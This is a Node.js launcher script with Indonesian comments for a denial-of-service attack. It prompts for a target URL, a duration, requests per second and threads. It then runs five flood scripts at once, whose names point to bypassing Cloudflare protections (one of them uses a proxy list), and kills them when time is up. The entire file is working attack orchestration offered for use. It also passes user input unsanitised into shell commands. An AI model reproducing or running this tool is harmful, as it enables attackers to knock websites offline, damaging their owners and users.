const { exec } = require('child_process');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Function untuk menjalankan command
function runCommand(command) {
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing command: ${command}`);
            console.error(`Error message: ${error.message}`);
            console.error(`Error code: ${error.code}`);
            console.error(`Error signal: ${error.signal}`);
            return;
        }
        if (stderr) {
            console.error(`Stderr: ${stderr}`);
            return;
        }
        console.log(`Stdout: ${stdout}`);
    });
}

// Function untuk menghentikan semua proses
function stopAllProcesses() {
    exec("pkill -f CFbypass.js", (error, stdout, stderr) => {
        if (error) {
            console.error(`Error killing CFbypass.js: ${error.message}`);
        }
    });
    exec("pkill -f TLS-BYPASS.js", (error, stdout, stderr) => {
        if (error) {
            console.error(`Error killing TLS-BYPASS.js: ${error.message}`);
        }
    });
    exec("pkill -f UAM.js", (error, stdout, stderr) => {
        if (error) {
            console.error(`Error killing UAM.js: ${error.message}`);
        }
    });
    exec("pkill -f MIXMAX.js", (error, stdout, stderr) => {
        if (error) {
            console.error(`Error killing MIXMAX.js: ${error.message}`);
        }
    });
    exec("pkill -f tlsvip.js", (error, stdout, stderr) => {
        if (error) {
            console.error(`Error killing tlsvip.js: ${error.message}`);
        }
    });
}

// Menanyakan input dari pengguna
rl.question('Enter URL: ', (web) => {
    rl.question('Enter time (in milliseconds): ', (time) => {
        rl.question('Enter RPS: ', (req) => {
            rl.question('Enter threads: ', (thread) => {
                // Menjalankan semua file dengan parameter
                runCommand(`node CFbypass.js ${web} ${time}`);
                runCommand(`node TLS-BYPASS.js ${web} ${time} ${req} ${thread}`);
                runCommand(`node MIXMAX.js ${web} ${time} ${req} ${thread}`);
                runCommand(`node tlsvip.js ${web} ${time} ${req} ${thread}`);
                runCommand(`node UAM.js ${web} ${time} ${req} ${thread} proxy3.txt`);

                // Menjalankan function stopAllProcesses setelah waktu yang ditentukan
                setTimeout(stopAllProcesses, parseInt(time, 10));

                rl.close();
            });
        });
    });
});
